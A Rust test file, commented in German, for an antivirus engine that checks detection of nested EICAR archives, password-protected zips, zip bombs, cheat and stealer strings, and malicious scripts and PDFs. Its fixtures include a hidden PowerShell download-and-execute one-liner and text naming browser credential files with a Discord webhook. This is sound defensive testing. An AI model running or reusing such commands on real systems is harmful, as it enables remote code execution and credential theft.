//! Dokument-, Skript- und Archiv-Prüfung Ende-zu-Ende – nur mit EICAR und selbst erzeugten,
//! harmlosen Dummy-Dateien. Prüft zugleich, dass nichts verändert wird.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::io::{Cursor, Write};

use aegis_core::risk::RiskLevel;
use aegis_core::testing::{DirSnapshot, assert_unchanged, eicar, write_fixture};
use aegis_engine::{Category, Engine, EngineConfig, ScanLimits};

fn zip_of(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut buf);
        for (name, body) in files {
            z.start_file(*name, zip::write::SimpleFileOptions::default())
                .unwrap();
            z.write_all(body).unwrap();
        }
        z.finish().unwrap();
    }
    buf.into_inner()
}

/// Setzt das Verschlüsselungs-Bit (Bit 0 der Flags) in lokalem Kopf und Verzeichnis – wie bei
/// einem passwortgeschützten Archiv. Der Inhalt bleibt harmlos.
fn mark_encrypted(mut zip: Vec<u8>) -> Vec<u8> {
    for (magic, flag_at) in [(b"PK\x03\x04", 6usize), (b"PK\x01\x02", 8)] {
        let positions: Vec<usize> = zip
            .windows(4)
            .enumerate()
            .filter(|(_, w)| *w == magic)
            .map(|(i, _)| i)
            .collect();
        for p in positions {
            zip[p + flag_at] |= 1;
        }
    }
    zip
}

fn codes(f: &aegis_engine::Finding) -> Vec<String> {
    f.reasons.iter().map(|r| r.code.clone()).collect()
}

#[test]
fn eicar_tief_im_archiv_wird_gefunden() {
    let home = tempfile::tempdir().unwrap();
    let inner = zip_of(&[("eicar.com", &eicar()), ("liesmich.txt", b"Hallo")]);
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gz.write_all(&inner).unwrap();
    let outer = zip_of(&[("innen.zip.gz", &gz.finish().unwrap())]);
    let path = write_fixture(home.path(), "paket.zip", &outer).unwrap();
    let before = DirSnapshot::capture(home.path()).unwrap();

    let f = Engine::with_builtin_rules().unwrap().scan_file(&path);
    assert_eq!(f.risk, RiskLevel::Dangerous);
    assert_eq!(f.category, Category::TestFile);
    let names: Vec<&str> = f.contained.iter().map(|c| c.name.as_str()).collect();
    assert!(
        names.contains(&"innen.zip.gz/innen.zip/eicar.com"),
        "{names:?}"
    );
    assert!(f.contained.iter().all(|c| c.risk > RiskLevel::Clean));
    assert_unchanged(&before, &DirSnapshot::capture(home.path()).unwrap());
}

#[test]
fn passwortgeschuetzt_und_zip_bombe_werden_ehrlich_gemeldet() {
    let home = tempfile::tempdir().unwrap();
    let locked = mark_encrypted(zip_of(&[("rechnung.exe", b"MZ harmlos")]));
    let locked = write_fixture(home.path(), "gesperrt.zip", &locked).unwrap();
    let bomb = zip_of(&[("nullen.bin", &vec![0u8; 3 * 1024 * 1024])]);
    let bomb = write_fixture(home.path(), "bombe.zip", &bomb).unwrap();

    let engine = Engine::new(EngineConfig {
        limits: ScanLimits {
            max_analyze_bytes: 1024 * 1024,
            ..ScanLimits::default()
        },
        ..EngineConfig::default()
    });
    let f = engine.scan_file(&locked);
    assert!(
        codes(&f).contains(&"container.encrypted".to_owned()),
        "{f:?}"
    );
    assert!(
        f.not_scannable
            .as_deref()
            .unwrap()
            .contains("Passwortgeschützt")
    );
    let f = engine.scan_file(&bomb);
    assert!(codes(&f).contains(&"container.bomb".to_owned()), "{f:?}");
    assert!(f.not_scannable.is_some());
}

#[test]
fn spiel_tool_und_cheat_mit_schadfunktionen() {
    let home = tempfile::tempdir().unwrap();
    // Harmlose Dummy-Dateien: nur Text mit typischen Zeichenketten, kein ausführbarer Code.
    let trainer = write_fixture(
        home.path(),
        "trainer.txt",
        b"Mein Trainer: aimbot an/aus, wallhack, no recoil",
    )
    .unwrap();
    let stealer = write_fixture(
        home.path(),
        "cheat.txt",
        b"aimbot wallhack | \\User Data\\Default\\Login Data | \\Local State | https://discord.com/api/webhooks/123/x",
    )
    .unwrap();
    let engine = Engine::with_builtin_rules().unwrap();
    let f = engine.scan_file(&trainer);
    assert_eq!(
        (f.risk, f.category),
        (RiskLevel::GameTool, Category::GameTool)
    );
    assert!(f.summary_de.contains("Anti-Cheat"));
    let f = engine.scan_file(&stealer);
    assert_eq!(f.risk, RiskLevel::Dangerous, "{:?}", codes(&f));
    assert!(codes(&f).contains(&"traits.combination".to_owned()));
    assert!(f.confidence.percent() < 90, "Merkmale sind keine Signatur");
    assert!(f.summary_de.contains("Merkmale"));
}

#[test]
fn skript_und_dokumente() {
    let home = tempfile::tempdir().unwrap();
    let ps1 = write_fixture(
        home.path(),
        "update.ps1",
        b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"",
    )
    .unwrap();
    let pdf = write_fixture(
        home.path(),
        "rechnung.pdf",
        b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj %%EOF",
    )
    .unwrap();
    let engine = Engine::with_builtin_rules().unwrap();
    let f = engine.scan_file(&ps1);
    assert_eq!(f.risk, RiskLevel::Suspicious, "{:?}", codes(&f));
    let f = engine.scan_file(&pdf);
    assert_eq!(codes(&f), ["pdf.javascript", "pdf.javascript_on_open"]);
    assert_eq!(f.risk, RiskLevel::Info);
}
